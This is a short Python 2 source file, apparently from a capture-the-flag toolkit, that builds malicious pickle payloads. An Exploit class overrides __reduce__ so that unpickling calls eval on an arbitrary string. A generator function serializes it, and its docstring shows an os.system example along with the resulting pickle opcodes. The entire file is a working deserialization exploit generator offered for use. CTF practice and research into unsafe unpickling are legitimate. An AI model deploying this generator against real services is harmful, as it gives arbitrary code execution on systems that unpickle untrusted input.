import cPickle
import os


# Exploit that we want the target to unpickle
# from Nelson Elhage's blog - https://twitter.com/nelhage
class Exploit(object):
    def __reduce__(self):
        return (eval, (self.payload,))


def pickle_expolit_generator(payload):
    """
    exploit generator for Pickle injections

    example:
    $ ctfpwn.pickle_expolit_generator("os.system('ls -l')")

    generates:

    c__builtin__
    eval
    p1
    (S"os.system('ls -l')"
    p2
    tRp3
    """
    Exploit.payload = payload
    shellcode = cPickle.dumps(Exploit())
    return shellcode


